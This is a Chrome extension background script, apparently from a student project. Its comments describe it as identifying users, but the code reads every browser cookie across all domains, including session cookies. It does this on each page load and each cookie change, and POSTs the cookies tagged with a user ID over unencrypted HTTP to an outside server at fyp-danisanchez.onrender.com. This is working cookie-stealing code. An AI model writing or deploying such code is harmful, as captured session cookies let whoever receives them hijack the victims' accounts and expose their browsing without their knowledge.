let sentCookies = {};

//Enabling the extension to be able to identify specific users

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

function sendCookiesToServer(cookies) {
  //local storage is used to identify the users
  chrome.storage.local.get("userId", (data) => {
      let userId = data.userId;
      if (!userId) {
          userId = generateUUID();
          chrome.storage.local.set({userId: userId});
      }
      //console.log("Retrieved userId:", userId);
      const formattedCookies = cookies.map(cookie => ({
          ...cookie,
          userId,
          expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : undefined,
          secure: cookie.secure || false,
          session: cookie.session || false
      }));

      const newOrUpdatedCookies = formattedCookies.filter(cookie => {
          const cookieId = `${cookie.domain}-${cookie.name}`;
          if (!sentCookies[cookieId] || sentCookies[cookieId] !== cookie.value) {
              sentCookies[cookieId] = cookie.value;
              return true;
          }
          return false;
      });

      if (newOrUpdatedCookies.length > 0) {
          fetch(`http://fyp-danisanchez.onrender.com/api/cookies`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cookies: newOrUpdatedCookies })
          })
          .then(response => response.json())
          .then(data => console.log("Cookies sent to server:", data))
          .catch(error => console.error('Error sending cookies to server:', error));
      }
  });
}
  
// here the cookies are send to the back end
function getAllCookiesAndSendToServer() {
  chrome.cookies.getAll({}, function(cookies) {
    if (chrome.runtime.lastError) {
      return;
    }
    sendCookiesToServer(cookies);

  });
}

let contentScriptLoaded = false;

chrome.runtime.onMessage.addListener((message, sender) => {
  if (message.action === "contentScriptReady") {
    contentScriptLoaded = true;
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active && contentScriptLoaded) {
    getAllCookiesAndSendToServer();
  }
});

chrome.cookies.onChanged.addListener(() => {
  getAllCookiesAndSendToServer();
});

